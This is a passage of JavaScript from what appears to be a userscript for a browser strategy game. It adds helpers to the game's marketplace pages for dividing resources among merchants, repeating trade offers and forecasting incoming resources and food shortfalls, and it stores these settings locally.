		}
		market_all[mr] = offer.type + ';' + wanted.type + ';' + mrate;
	}
	// restore filter settings
	if( RB.Setup[8] > 1 ) {
		loadCookie('mf', 'market_fi');
		for( var i=0; i < 3; i++ ) applyFilter_row( i );
		applyFilter_hide();
	}
}

// market send page :)
function marketSend () {
	function setMerchantsCell(tM, colM) {
		cM.innerHTML = tM;
		$at(cM, [['style', 'font-size:11px; color:' + colM + ';line-height:16px;']]);
	};
	function getTotTransport() {
		var totT = 0;
		for (var i = 1; i < 5; i++) {
			var aR = parseInt(rxI[i].value);
			if (isFinite(aR)) totT += aR;
		}
		return totT;
	}
	function mhRowUpdate() {
		var totTransport = getTotTransport();
		var totMerchants = Math.ceil(totTransport / maxC);
		var mhColor = 'darkgreen';
		var crtWaste = maxC - (totTransport - (totMerchants-1) * maxC);
		var crtExceed = totTransport - maxTr;

		var mhText = "<b>" + mName + ": " + totMerchants + " / " + maxM + "<br />"+(ltr?"&#931;":"")+"= " + totTransport;
		if (totMerchants > maxM) {
			mhColor = "red";
			mhText += " ( "+ crtExceed + " )";
		} else if ( crtWaste ) mhText += " ( -"+ crtWaste + " )";
 		mhText += "</b>";
		setMerchantsCell(mhText, mhColor);
	}
	function getMaxRTr () {
		var maxRRTr = parseInt(maxRC.value);
		var maxRTr = isNaN(maxRRTr)? maxTr: maxRRTr;
		var maxRMM = parseInt(maxRM.value);
		var maxRTTr = isNaN(maxRMM)? maxTr: maxRMM * maxC;
		return Math.min(maxRTr, maxRTTr);
	}
	function mhRowLinkR ( RC ) {
		var maxRTr = getMaxRTr();
		var totTransport = getTotTransport();
		var aR = parseInt(rxI[RC].value).NaN0();
		if( lastLinkR[0] != RC || lastLinkR[3] != aR ) {
			lastLinkR = [RC,0,aR];
			var totMerchants = Math.ceil(totTransport / maxC);
			var crtExceed = totTransport - maxRTr;
			if( crtExceed > 0 ) {
				rxI[RC].value = Math.ceil(crtExceed / maxC) > Math.ceil(aR / maxC) || aR < crtExceed ? 0: rxI[RC].value - crtExceed;
			} else {
				var crtWaste = maxC - (totTransport - (totMerchants-1) * maxC);
				var recomended = crtWaste != 0 ? aR + crtWaste : 0;
				var i = recomended < resNow[RC-1] ? recomended : resNow[RC-1];
				rxI[RC].value = crtExceed < 0 ? i : 0;
			}
		} else {
			var i = ( aR == 0 && lastLinkR[1] == 0 ) ? false : true;
			rxI[RC].value = lastLinkR[1] == 0 && i ? 0 : lastLinkR[2];
			if( ++lastLinkR[1] > 1 || ! i ) lastLinkR[0] = 0;
		}
		lastLinkR[3] = parseInt(rxI[RC].value);
		mhRowUpdate();
	}
	function mhRowLinkM ( RC ) {
		var aR = parseInt(rxI[RC].value);
		rxI[RC].value = aR > maxC ? aR - maxC : '';
		mhRowUpdate();
	}
	function mhRowLinkP ( RC ) {
		var aR = parseInt(rxI[RC].value);
		var i = isNaN(aR) ? maxC : aR + maxC;
		rxI[RC].value = i < resNow[RC-1] ? i : resNow[RC-1];
		mhRowUpdate();
	}
	function mhRowsLinkM () {
		for( var i = 1; i < 5; i++ )
			if( checkRes[i].checked ) mhRowLinkM ( i );
	}
	function mhRowsLinkP () {
		for( var i = 1; i < 5; i++ )
			if( checkRes[i].checked ) mhRowLinkP ( i );
	}
	var extNegat = 0;
	function mhRowLinkMem () {
		loadVCookie('vPPH', 'village_PPH', RB.wantsMem[4]);
		if( RB.wantsMem[4] == 0 ) return;
		var htR = getTTime( calcDistance(RB.wantsMem[4], village_aid), MTime[parseInt(RB.Setup[2])]*sM, 0, 0 );
		var ht = parseInt(RB.wantsMem[9]) < htR ? htR - parseInt(RB.wantsMem[9]): 0;
		for( var i = 0; i < 4; i++ ) {
			var wantRes = Math.ceil(parseInt(RB.wantsMem[i]) - RB.village_PPH[i]/3600 * ht);
			if( RB.village_PPH[i] < 0 && ht > 0 ) {
				var deltaTime = RB.village_PPH[12] > 0 ? Math.round((new Date().getTime())/1000) - parseInt(RB.village_PPH[12]): 0;
				var leftResInV = Math.floor(RB.village_PPH[i]/3600 * (deltaTime + ht) + RB.village_PPH[i+4]);
				if( leftResInV < 0 ) {
					var nowResInV = Math.floor(RB.village_PPH[i]/3600 * deltaTime + RB.village_PPH[i+4]);
					if( nowResInV < 0 ) nowResInV = 0;
					wantRes = nowResInV + parseInt(RB.wantsMem[i]);
				}
				var minLeft = prompt(gtext("consnegat"), 10);
				if( minLeft == null ) minLeft = 0;
				if( minLeft == 0 ) wantRes = RB.wantsMem[i];
				else {
					extNegat = Math.ceil(RB.village_PPH[i]/3600 * parseInt(minLeft)*60);
					wantRes -= extNegat;
				}
			}
			if( wantRes < 0 ) wantRes = 0;
			if( checkRes[i+1].checked ) rxI[i+1].value = wantRes < resNow[i] ? wantRes: resNow[i];
		}
		mhRowUpdate();
		sendResourses( RB.wantsMem[4] );
	}
	var mcFL = true;
	function rEL () {
		$g('button').removeEventListener('DOMNodeInserted',rEL);
		if( mcFL ) {
			(ver42FL?$g('build'):$g('merchantsAvailable')).addEventListener('DOMNodeInserted',reloadMerchants,false);
			mcFL = false;
		}
		setTimeout(reloadSettings,100);
	}
	function removeACh () {
		if( RB.dictFL[23] == 1 ) $g('button').addEventListener('DOMNodeInserted',rEL,false);
		if( typeof checkRes == 'undefined' ) return;

		for( var i = 1; i < 5; i++ )
			checkRes[i].checked = false;

		if( $gn('x').length < 1 ) return;
		var xx = parseInt($gn('x')[0].value);
		var yy = parseInt($gn('y')[0].value);
		if( isNaN(xx) || isNaN(yy) ) return;
		if( xy2id(xx,yy) == RB.wantsMem[4] ) {
			RB.wantsMem[3] = parseInt(RB.wantsMem[3]) - extNegat;
			saveCookie('Mem', 'wantsMem');
		}
	}
	function mhRowsLinkPP () {
		var maxRTr = getMaxRTr();
		switch (lPP) {
			case 0:
				refP.innerHTML = '&nbsp;%';
				lPP++;
				var aRF = [];
				for( var i = 0; i < 4; i++ ) if( checkRes[i+1].checked && resNow[i] > 0 ) aRF.push(resNow[i]);
				if( aRF.length > 0 ) {
					aRF.sort(function(a,b){return b-a;});
					var aRc = 0;
					var aRc2 = 0;
					for( i=aRF.length; i>0; i--) {
						aRc += aRc2;
						aRc2 = aRF[i-1];
						if( aRc+aRF[i-1]*i >  maxRTr ) break;
					}
					aRc = Math.floor((maxRTr-aRc)/i);
					for( var i = 0; i < 4; i++ )
						if( checkRes[i+1].checked ) rxI[i+1].value = aRc > resNow[i] ? resNow[i]: aRc;
					mhRowUpdate();
				}
				break;
			case 1:
				refP.innerHTML = '&nbsp;C';
				lPP++;
				var aRc = 0;
				var aRn = 0;
				for( var i = 1; i < 5; i++ ) if( checkRes[i].checked ) { aRc++; aRn += resNow[i-1]; }
				if( aRc > 0 ) {
					for( var i = 1; i < 5; i++ ) {
						if( checkRes[i].checked ) {
							var toRes = Math.floor((resNow[i-1]/aRn) * maxRTr);
							rxI[i].value = toRes < resNow[i-1] ? toRes : resNow[i-1];
						}
					}
					mhRowUpdate();
				}
				break;
			default:
				for( var i = 1; i < 5; i++ )
					if( checkRes[i].checked ) rxI[i].value = '';
				mhRowUpdate();
				refP.innerHTML = '&nbsp;=';
				lPP = 0;
				break;
		}
	}
	function mhRowLinkMPlus () {
		var xx = parseInt($gn('x')[0].value);
		var yy = parseInt($gn('y')[0].value);
		if( isNaN(xx) || isNaN(yy) ) return;
		RB.wantsMem = [0,0,0,0,0,0,0,0,0,0];
		for( var i=0; i<4; i++ )
			 if( isFinite(parseInt(rxI[i+1].value)) ) RB.wantsMem[i] = parseInt(rxI[i+1].value);
 		RB.wantsMem[4] = xy2id(xx,yy);
		saveCookie('Mem', 'wantsMem');
		alert( "Saved: "+ RB.wantsMem[0] +" | "+ RB.wantsMem[1] +" | "+ RB.wantsMem[2] +" | "+ RB.wantsMem[3] );
	}
	function mhRowLinkAMem () {
		var tID = $gn('kid')[0].value;
		if( tID != RB.wantsMem[4] ) return;
		loadVCookie('vPPH', 'village_PPH', RB.wantsMem[4]);
		var htR = getTTime( calcDistance(RB.wantsMem[4], village_aid), MTime[parseInt(RB.Setup[2])]*sM, 0, 0 );
		var ht = parseInt(RB.wantsMem[9]) < htR ? htR - parseInt(RB.wantsMem[9]): 0;
		for( var i = 0; i < 4; i++ ) {
			var rxI = $gn('r' + (i+1))[0].value;
			if( isNaN(parseInt(rxI)) || parseInt(rxI) == 0 ) continue;
			RB.wantsMem[i] = parseInt(RB.wantsMem[i]) - parseInt(rxI) - Math.ceil(RB.village_PPH[i]/3600 * ht);
			if( RB.wantsMem[i] <= 0 ) RB.wantsMem[i] = 0;
		}
		if( parseInt(RB.wantsMem[0])+parseInt(RB.wantsMem[1])+parseInt(RB.wantsMem[2])+parseInt(RB.wantsMem[3]) > 0 ) {
			if( parseInt(RB.wantsMem[9]) < ht ) RB.wantsMem[9] = ht;
		} else RB.wantsMem = [0,0,0,0,0,0,0,0,0,0];
		saveCookie('Mem', 'wantsMem');
	}
	function reloadSettings () {
		addButtonsEvent( checkTargetValidate() );
		for( var i = 1; i < 5; i++ )
			checkRes[i].checked = true;
		reloadMerchants();
	}
	function addButtonsEvent ( fl ) {
		var ss = ver4FL ? $gt('button',$gn('snd')[0]) : $gn('s1');
		for( i=0; i<ss.length; i++ ) ss[i].addEventListener('click', removeACh, true);
		// travel time
		if( ! fl && ss.length > 0 )
			addShowDistanceIn( ss[0].parentNode, -1 );
		if( fl && ver4FL ) $gn('dname')[0].value = '';
	}
	function checkTargetValidate () {
		var basee = $g('target_validate');
		if( basee ) {
			if( RB.dictFL[23] == 0 ) {
				var ss = ver4FL ? $gt('button',$gn('snd')[0])[0] : $gn('s1')[0];
				ss.addEventListener('click', mhRowLinkAMem, true);
			} else $gc("sendRessources",$gn('snd')[0])[0].addEventListener('click', mhRowLinkAMem, true);
			addSpeedAndRTSend(basee);
			return true;
		} else return false;
	}
	function reloadMerchants () {
		checkMerchants();
		if( parseInt(maxRM.value).NaN0() > maxM ) maxRM.value = maxM;
		if( parseInt(maxRC.value).NaN0() > maxTr ) maxRC.value = maxTr;
		mhRowUpdate();
	}
	function checkMerchants () {
		moC = ver4FL ? $gc('boxes-contents')[0]: $gc('mer')[0];
		if (moC) {
			var moCC = moC.innerHTML.onlyText().match(/(\S+)\s+\D*?(\d+)\D+?(\d+)/);
			mName = moCC[1];
			if( ver42FL ) maxM = parseInt(moCC[3]);
			else maxM = parseInt(moCC[2]);
			merchInWork = parseInt(moCC[3]) - maxM;
			return false;
		} else return true;
	}

	if( checkTargetValidate() ) return;
	var basee = $g('send_select');
	if( ! basee ) return;
	basee.setAttribute("style","width:"+(ver4FL?50:45)+"%;");

	var moC = null;
	var maxC = 0;
	var rxI = new Array();
	var mName = "";
	var maxM = 0;
	var maxTr = 0;
	var lastLinkR = [0,0,0,0];
	var checkRes = [];
	var lPP = 0;

	if( checkMerchants() ) return;

	if( mName != RB.dictionary[2] ) {
		RB.dictionary[2] = mName;
		saveCookie( 'Dict', 'dictionary' );
	}

	fillXY();

	for (var i = 1; i < 5; i++){
		rxI[i] = $g('r' + i);
		rxI[i].addEventListener('keyup', mhRowUpdate, false);
		rxI[i].addEventListener('change', mhRowUpdate, false);
		var iRow = basee.rows[i-1];
		iRow.cells[0].getElementsByTagName('a')[0].addEventListener('click', mhRowUpdate, false);
		iRow.cells[3].getElementsByTagName('a')[0].addEventListener('click', mhRowUpdate, false);
		var ref = $a('-',[['href',jsVoid]]);
		ref.addEventListener('click', function(x) { return function() { mhRowLinkM(x); }}( i ), false);
		iRow.appendChild($c(ref,[['width','5%']]));
		var ref = $a('R',[['href',jsVoid]]);
		ref.addEventListener('click', function(x) { return function() { mhRowLinkR(x); }}( i ), false);
		iRow.appendChild($c(ref,[['width','5%']]));
		var ref = $a('+',[['href',jsVoid]]);
		ref.addEventListener('click', function(x) { return function() { mhRowLinkP(x); }}( i ), false);
		iRow.appendChild($c(ref,[['width','5%']]));
		checkRes[i] = $e('INPUT',[['type','checkbox'],['checked','checked'],['name',allIDs[18]+i]]);
		iRow.appendChild($c(checkRes[i],[['width','5%']]));
	};
	maxC = parseInt(iRow.cells[3].innerHTML.match(/>\(?(\d+)\)?</)[1]);
	maxTr = maxM * maxC;

	if( maxC != RB.village_Var[0] ) {
		RB.village_Var[0] = maxC;
		saveVCookie( 'VV', RB.village_Var );
	}

	var maxRM = $e('INPUT',[['type', 'TEXT'],['size',2],['value',maxM],['style','font-size:80%;']]);
	var maxRC = $e('INPUT',[['type', 'TEXT'],['size',5],['value',maxTr],['style','font-size:80%;']]);
	moC.appendChild($em('SPAN',[maxRM,' Σ=',maxRC],[['style','margin:0px 5px;font-size:12px;']]));

	var newTR = $e('tr');
	var cM = $c('',[['colspan','3']]);
	newTR.appendChild(cM);
	if( basee.rows.length > 4 ) {
		for( i=basee.rows.length-1; i>3; i-- ) {
			var nc = basee.rows[i].cells.length;
			basee.rows[i].cells[nc-1].setAttribute('colspan',9-nc);
		}
		insertAfter(newTR,basee.rows[3]);
	} else basee.appendChild(newTR);
	mhRowUpdate();

	var ref = $a('(M)',[['href',jsVoid]]);
	ref.addEventListener('click', mhRowLinkMPlus, false);
	newTR.appendChild($c(ref));
	var ref = $a('-',[['href',jsVoid]]);
	ref.addEventListener('click', mhRowsLinkM, false);
	newTR.appendChild($c(ref,[['width','5%']]));
	var ref = $a('M',[['href',jsVoid]]);
	ref.addEventListener('click', mhRowLinkMem, false);
	newTR.appendChild($c(ref,[['width','5%']]));
	var ref = $a('+',[['href',jsVoid]]);
	ref.addEventListener('click', mhRowsLinkP, false);
	newTR.appendChild($c(ref,[['width','5%']]));
	var refP = $a('&nbsp;=',[['href',jsVoid]]);
	refP.addEventListener('click', mhRowsLinkPP, false);
	newTR.appendChild($c(refP,[['width','5%']]));

	if( /&r\d=/.test(crtPath) )
		for( i=1; i<5; i++ ) try{ rxI[i].value = crtPath.match(new RegExp('&r'+i+'=(\\d+)'))[1]; } catch(e){};

	addButtonsEvent();
}

// 'Repeat' offer possition
function marketReSel( x ) {
	var selTable = $g('sell_overview');
	var strow = selTable.tBodies[0].rows[x[0]];

	var offer = strow.cells[1];
	var wanted = strow.cells[(ver4FL?3:2)];
	var dur = toNumber( strow.cells[(ver4FL?6:5)].innerHTML );

	offer.value = parseInt( offer.childNodes.item(1).nodeValue );
	offer.type = offer.childNodes.item(0).getAttribute('class').substring(1);
	wanted.value = parseInt( wanted.childNodes.item(1).nodeValue );
	wanted.type = wanted.childNodes.item(0).getAttribute('class').substring(1);

	$xf('.//select[@name="rid1"]','f',x[1]).value = offer.type;
	$xf('.//input[@name="m1"]','f',x[1]).value = offer.value;

	$xf('.//select[@name="rid2"]','f',x[1]).value = wanted.type;
	$xf('.//input[@name="m2"]','f',x[1]).value = wanted.value;

	if( isFinite(dur) ) {
		$xf('.//input[@name="d1"]','f',x[1]).setAttribute('checked','checked');
		$xf('.//input[@name="d2"]','f',x[1]).value = dur;
	} else {
		$xf('.//input[@name="d1"]','f',x[1]).removeAttribute('checked');
	}
}

// automatically set min resourse as wanted & max resourse as offer
// add 'Repeat' key
function marketOffer() {
	function merUpd () {
		var aR = parseInt(m1.value);
		m3.innerHTML = isNaN(aR) ? '': '( '+RB.dictionary[2]+' '+ Math.ceil(aR/RB.village_Var[0]) + (aR % RB.village_Var[0] != 0 ? ' : -' + (RB.village_Var[0] - aR % RB.village_Var[0]):'') + ' )';
		var aR2 = parseInt(m2.value);
		if( ! isNaN(aR) && ! isNaN(aR2) && aR > 0 ) {
			var rt = Math.round(aR2/aR*100)/100;
			var rtColor = rt == 1 ? 'black': rt < 1 ? 'red' : 'green';
			m3.appendChild($ee('SPAN',rt,[['style','font-weight:bold;color:'+rtColor+';padding:0px 10px;']]));
		}
	}
	function mofLinkM () {
		var aR = parseInt(m1.value);
		m1.value = isNaN(aR) ? '': aR <= RB.village_Var[0] ? '': aR - RB.village_Var[0];
		merUpd();
	}
	function mofLinkP () {
		var aR = parseInt(m1.value);
		m1.value = isNaN(aR) ? RB.village_Var[0] : aR + RB.village_Var[0];
		merUpd();
	}

	var selTable = $xf('.//table[@id="sell"]','l',cont);
	switch(selTable.snapshotLength) {
		case 0: return;
		case 1: selTable = selTable.snapshotItem(0); break
		default: selTable = $xf('.//form[contains(@style,"inline")]//table[@id="sell"]','f',cont);
	}
	var maxR = 0;
	var minR = 0;
	for( var i = 1; i < 4; i++ ) {
		if( resNow[i] > resNow[maxR] ) maxR = i;
		if( resNow[i] < resNow[minR] ) minR = i;
	}
	$xf('.//select[@name="rid1"]','f',selTable).value = maxR + 1;
	$xf('.//select[@name="rid2"]','f',selTable).value = minR + 1;

	$at(selTable.rows[0].cells[2],[['style','width:auto;']]);
	$at(selTable.rows[1].cells[2],[['style','width:auto;']]);

	var refP = $a('+',[['href',jsVoid]]);
	refP.addEventListener('click', mofLinkP, false);
	selTable.rows[0].insertBefore($c(refP),selTable.rows[0].cells[3]);
	var refM = $a('-',[['href',jsVoid]]);
	refM.addEventListener('click', mofLinkM, false);
	selTable.rows[1].insertBefore($c(refM),selTable.rows[1].cells[3]);

	var m1 = $xf('.//input[@name="m1"]','f',selTable); // cell for offering
	m1.addEventListener('keyup', merUpd, false);
	m1.addEventListener('change', merUpd, false);

	var m2 = $xf('.//input[@name="m2"]','f',selTable); // cell for searching
	m2.addEventListener('keyup', merUpd, false);
	m2.addEventListener('change', merUpd, false);

	var m3 = $e('SPAN',[['style','margin: 0px 10px;']]);
	if( ver4FL )
		selTable.parentNode.appendChild(m3);
	else
		selTable.parentNode.getElementsByTagName('P')[0].appendChild(m3);

	var reSelTable = $g('sell_overview');
	if ( ! reSelTable ) return;
	// add additional field
	var strows = reSelTable.tHead.rows;
	if( ! ver4FL ) strows[0].cells[0].setAttribute("colspan","7");
	strows[(ver4FL?0:1)].appendChild($c('&nbsp;',[['style','width:5%;']]));
	// fill rows
	var strows = reSelTable.tBodies[0].rows;
	for (var mr = 0; mr < strows.length; mr++ )
	{
		var newTD = $c($a('R',[['href',jsVoid]]));
		newTD.addEventListener('click', function(x) { return function() { marketReSel(x); }}( [mr,selTable] ), false);
		strows[mr].appendChild(newTD);
	}
}

// calculate incomming resourses
var mSInit = true;
function marketSumm () {
	marketSummReal();
	mSInit = false;
	if( RB.dictFL[23] == 1 ) setInterval(marketSummReal,1000);
}
function marketSummReal () {
	if( RB.Setup[10] == 0 ) return;
	var aT = $gc('traders',cont);
	if( aT.length == 0 ) return;
	if( $gc(allIDs[29],aT[0]).length > 0 ) return;
	if( ! mSInit ) {
		initRes = true; getResources(); progressbar_ReInit(); addSpeedAndRTSend();
	}
	var cH4 = $gt('H4');
	if( cH4 ) var merchB = cH4.length;
	var i = cH4[0].innerHTML.onlyText().trim();
	if( merchInWork != 0 && merchB == 1 ) {
		if( ver4FL ) {
			if( RB.dictionary[23] != '' && RB.dictionary[23] != i ) return;
		} else {
			if( ! /<span\s+class="f10"/i.test(aT[0].innerHTML) ) return;
		}
	} else {
		if( mSInit && RB.dictionary[23] != i ) {
			RB.dictionary[23] = i;
			saveCookie( 'Dict', 'dictionary' );
		}
	}
// add 2x 1x tables
	if( RB.Setup[33] > 0 ) {
		var extRT = new Array();
		for (i = 0; i < aT.length; i++) {
			// get count of retry
			var multFL = $gc('repeat',aT[i]);
			if( multFL.length > 0 ) {
				// get time to go
				var timeToGo = toSeconds(aT[i].rows[1].cells[1].innerHTML);
				var tdist = calcDistance(village_aid,getVid($gt('A',aT[i].rows[0].cells[1])[0].getAttribute('href')));
				var htR = getTTime( tdist, MTime[parseInt(RB.Setup[2])]*sM, 0, 0 );
				var cnt = parseInt(multFL[0].innerHTML.match(/\d/)[0]);
				for( var nc=cnt-1; nc>0; nc-- ) {
					var tmpNode = aT[i].cloneNode(true);
					$gc('repeat',tmpNode)[0].innerHTML=nc+'x';
					var newT = htR * (cnt-nc)*2 + timeToGo;
					$gc('at',tmpNode)[0].innerHTML = $gc('at',tmpNode)[0].innerHTML.replace(/\d+:\d+/,formatTime(absTime(newT),5));
					var j=timerB.length;
					timerB[j] = new Object();
					timerB[j].time = newT;
					timerB[j].obj = $gt('span',$gc('in',tmpNode)[0])[0];
					timerB[j].obj.removeAttribute('id');
					timerB[j].obj.innerHTML = formatTime(newT,0);
					tmpNode.rows[1].cells[1].setAttribute('style','background-color:#F8FFEE;');
					extRT.push([newT,tmpNode]);
				}
			}
			if( ! (aT[i].nextSibling) ) break;
			if( aT[i].nextSibling.nodeName.match(/h4/i) ) break;
		}
		if( extRT.length > 0 ) {
			lastTimerB = timerB.length;
			extRT.sort(function(a,b){return a[0]-b[0];});
			for (var i = 0; i < aT.length; i++) {
				// get time to go
				var timeToGo = toSeconds(aT[i].rows[1].cells[1].innerHTML);
				if( timeToGo > extRT[0][0] ) {
					aT[i].parentNode.insertBefore(extRT[0][1],aT[i]);
					extRT.shift();
					if( extRT.length == 0 ) { i++; break; }
				}
				if( ! (aT[i].nextSibling) ) { i++; break; }
				if( aT[i].nextSibling.nodeName.match(/h4/i) ) { i++; break; }
			}
			var nc = aT[--i].nextSibling;
			for (i = 0; i < extRT.length; i++) {
				if( nc )
					nc.parentNode.insertBefore(extRT[i][1],nc);
				else
					aT[i].parentNode.appendChild(extRT[i][1]);
			}
		}
	}

	resourceCalculatorInit();
	for (i = 0; i < aT.length; i++) {
		// get time to go
		var timeToGo = toSeconds(aT[i].rows[1].cells[1].innerHTML);
		// get incoming resources
		var incomingRes = aT[i].rows[2].cells[1].innerHTML.match( />\s*?\d+.?/g );

		resourceCalculator( aT[i], timeToGo, incomingRes, 0 );
		if( ! (aT[i].nextSibling) ) break;
		if( aT[i].nextSibling.nodeName.match(/h4/i) ) break;
	}
	if( RB.Setup[10] > 1 ) resourceCalculatorSumm(cH4[0].nextSibling, timeToGo);
	if( RB.Setup[10] > 2 ) redLinesSumm(cH4[0].nextSibling);
}

var incomeToGo = [];
var summIncomingRes = [];
var serverTime = 0;
var lastTime = 0;
var rpCount = 0;
var redLines = [];
var redLineFL = true;
var timeToZero = 0;

function resourceCalculatorInit () {
	incomeToGo = resNow.slice();
	serverTime = getServerTime();
	lastTime = 0;
	summIncomingRes = [0,0,0,0];
	rpCount = 0;
	redLines.length = 0;
	redLineFL = true;
	timeToZero = 0;

	var existT = $gc(allIDs[13],cont);
	for( var i = 0; i < existT.length; i++ ) cont.removeChild(existT[i].parentNode);
}

function resourceCalculator ( tObj, timeToGo, incomingRes, tType ) { // tType 0-market 1-RP
	var textIncome = '';
	var redLine = '';
	var redTime = 0;
	var rLl = redLines.length-1;
	var retFL = false;
	var incomeToGoSumm = 0;
	while( /\/|x/.test(incomingRes[0]) ) incomingRes.shift();
	for( var j = 0; j < 4; j++ ) {
		incomingRes[j] = parseInt(incomingRes[j].match(/\d+/)[0]);
		var extraRes = 0;
		var mColor = '';
		summIncomingRes[j] += incomingRes[j];
		incomeToGo[j] = Math.round(incomepersecond[j] * (timeToGo - lastTime) + incomeToGo[j]);
		if( incomeToGo[j] < 0 ) {
			redTime = serverTime + timeToGo - Math.floor(incomeToGo[j]/incomepersecond[j]);
			redLine += ' <img src="img/x.gif" class="r' + (j+1) + '"> ' + formatTime(redTime,1);
			extraRes = incomeToGo[j];
			mColor = 'red';
			incomeToGo[j] = 0;
		}
		incomeToGo[j] += incomingRes[j];
		if( incomeToGo[j] > fullRes[j] ) {
			extraRes = incomeToGo[j] - fullRes[j];
			incomeToGo[j] = fullRes[j];
			mColor = 'red';
		}
		textIncome += ' &nbsp;<img src="img/x.gif" class="r' + (j+1) + '"> <span style="color: ' + mColor + ';">' + incomeToGo[j];
		if( extraRes != 0 ) textIncome += ' (' + (extraRes > 0 ? '+' + extraRes: extraRes) + ') ';
		textIncome += '</span>';
		incomeToGoSumm += incomeToGo[j];
	}
	if( incomepersecond[3] < 0 ) {
		var rLlFL = rLl;
		var ntf = fullRes[3]-incomeToGo[3];
		timeToZero = timeToGo - Math.round(incomeToGo[3]/incomepersecond[3]);
		if( RB.Setup[10] > 2 ) textIncome += ' <b>/ '+ ntf +'</b>';
		else if( timeToZero < 86400 )
			textIncome += ' <img src="img/x.gif" class="r5">' + formatTime(serverTime + timeToZero,2);
		if( redTime > 0 ) {
			if( redLineFL ) {
				redLines[++rLl] = [extraRes,redTime,0, ntf];
				redLineFL = false;
			}
			if( incomingRes[3] == 0 ) {
				redLines[rLl][0] += extraRes;
			} else {
				redLines[rLl][2] = serverTime + timeToGo;
				redLineFL = true;
			}
		} else {
			if( extraRes > 0 )
				redLines[++rLl] = [extraRes, serverTime+timeToGo, serverTime+timeToGo, ntf];
		}
		if( RB.Setup[10] > 2 && rLlFL < rLl ) {
			tObj.setAttribute("id", allIDs[44]+rLl);
			retFL = true;
		}
	}
	if( RB.Setup[11] > 0 ) textIncome += ' (<img class="npc" src="img/x.gif"> '+incomeToGoSumm+')';
	var newFText = retFL ? $em('A',[trImg("clock"),' ',formatTime(absTime(timeToGo), 1)],[['href','#'+allIDs[31]]]):
		$em('SPAN',[trImg("clock"),' ',formatTime(absTime(timeToGo), 1)]); // 2 ??
	if( tType == 0 ) {
		var newTR = $ee('tr',$c( newFText ),[['class','res']]);
		newTR.appendChild( $c( textIncome ));
		tObj.appendChild( newTR );
	} else {
		var existT = $gc(allIDs[20],tObj);
		if( existT.length > 0 ) tObj.removeChild(existT[0].parentNode);
		var newTR = $ee('TR',$c(newFText),[['class',allIDs[20]]]);
		newTR.appendChild($c(textIncome,[['colspan','11'],['style','text-align:'+docDir[0]+';']]));
		tObj.appendChild($ee('TBODY',newTR,[['class','infos']]));
	}
	lastTime = timeToGo;

	if( redLine.length > 0 ) tObj.parentNode.insertBefore($ee('table',$ee('tr',$c(redLine)),[['class',allIDs[13]]]),tObj);

	rpCount++;
}

function resourceCalculatorSumm ( tObj, timeToGo ) {
	if( rpCount == 0 ) return;

	function linkMMem () {
		for( var j = 0; j < 4; j++ ) {
			RB.wantsMem[j] -= summIncomingRes[j];
			if( RB.wantsMem[j] < 0 ) RB.wantsMem[j] = 0;
		}
		saveCookie('Mem', 'wantsMem');
		alert( "Corrected to: "+ RB.wantsMem[0] +" | "+ RB.wantsMem[1] +" | "+ RB.wantsMem[2] +" | "+ RB.wantsMem[3] );
	}

	var rSumm = 0;
	var newR1 = $ee('TR',$c(trImg('clock')));
	var newR2 = $ee('TR',$c(formatTime(serverTime + timeToGo, 1)));
	var newR3 = $ee('TR',$c('&nbsp;'));

	var t = timerB.length;
	for( var j = 0; j < 4; j++ ) {
		rSumm += summIncomingRes[j];
		newR1.appendChild($c(trImg('r' + (j+1))));
		newR2.appendChild($c(summIncomingRes[j]));
		timerB[t] = new Object();
		timerB[t].time = incomepersecond[j] > 0 ? Math.round((fullRes[j]-incomeToGo[j]) / incomepersecond[j])+lastTime : Math.round(incomeToGo[j] / incomepersecond[j])-lastTime;
		timerB[t].obj = $eT('TD', timerB[t].time, 0);
		newR3.appendChild(timerB[t++].obj);
	}
	lastTimerB = timerB.length;

	var existT = $g(allIDs[30]);
	if( existT ) existT.parentNode.removeChild(existT);

	newR1.appendChild($c('&#931;('+rpCount+')'));
	newR2.appendChild($c(rSumm));
	var MM = $a('(M-)',[['href',jsVoid]]);
	MM.addEventListener('click', linkMMem, false);
	newR3.appendChild($c(MM));
	var newT = $ee('TABLE',newR1,[['class',allIDs[7]],['style','background-color:#F8FFEE;width:100%;margin-bottom:15px;'],['id',allIDs[30]]]);
	newT.appendChild(newR2);
	newT.appendChild(newR3);

	tObj.parentNode.insertBefore(newT,tObj);
}

function redLinesSumm ( tObj ) {
	if( incomepersecond[3] >= 0 ) return;

	function td ( xx ) {
		return xx>86400?xx-86400:xx;
	}

	var existT = $g(allIDs[31]);
	if( existT ) existT.parentNode.removeChild(existT);

	var newR = $em('TR',[$c(gtext("hunger")),$c(gtext("duration")),$c(gtext("deficit")),$c(RB.dictionary[21])]);
	var newT = $ee('TABLE',newR,[['class',allIDs[7]],['style','background-color:#FFE8D8;width:100%;margin-bottom:15px;'],['id',allIDs[31]]]);

	for( var i=0; i<redLines.length; i++ ) {
		if( redLines[i][2] == 0 ) {
			newT.appendChild($em('TR',[$c($a(formatTime(td(redLines[i][1]),1),[['href','#'+allIDs[44]+i]])),$c('--:--'),$c('-'),$c(redLines[i][3])]));
		} else {
			var dur = redLines[i][2]-redLines[i][1];
			if( dur == 0 )
				newT.appendChild($em('TR',[$c($a(formatTime(td(redLines[i][1]),1),[['href','#'+allIDs[44]+i]])),$c('--:--'),$c('+'+redLines[i][0],[['style','color:red;background-color:white;']]),$c(redLines[i][3])]));
			else
				newT.appendChild($em('TR',[$c($a(formatTime(td(redLines[i][1]),1),[['href','#'+allIDs[44]+i]])),$c(formatTime(dur,0)),$c(redLines[i][0]),$c(redLines[i][3])]));
		}
	}
	if( redLineFL )
		newT.appendChild($em('TR',[$c(formatTime(absTime(timeToZero,serverTime),1)),$c('--:--'),$c('-'),$c('-')]));

	tObj.parentNode.insertBefore(newT,tObj);
}

/************************* cookie ****************************/

var cookieDelim = [
	[")\\.([-\\.\\d]+)",'.','/'],
	[")@_(.*?)@#_",'@_','@#_']];

function loadVCookie ( nameCoockie, contentCookie, vID, cType ) {
	var cvID = vID || village_aid;
	var cvT = cType || 0;
	var RCookie = RB_getValue(GMcookieID + nameCoockie,'');
	var Rej = new RegExp("(" + cvID + cookieDelim[cvT][0]);
	var oneCookie = RCookie.match(Rej);
	if( cvT == 1 ) RB[contentCookie].length = 0;
	if( oneCookie != undefined ) {
		var cookieValue = oneCookie[2].split(cookieDelim[cvT][1]);
		var sI = cvT == 0 ? 0: 1;
		var contentLength = cvT == 0 ? RB[contentCookie].length: cookieValue[0].length == 0 ? 0: parseInt(cookieValue[0]);
		for( var j = 0; j < contentLength; j++ ) {
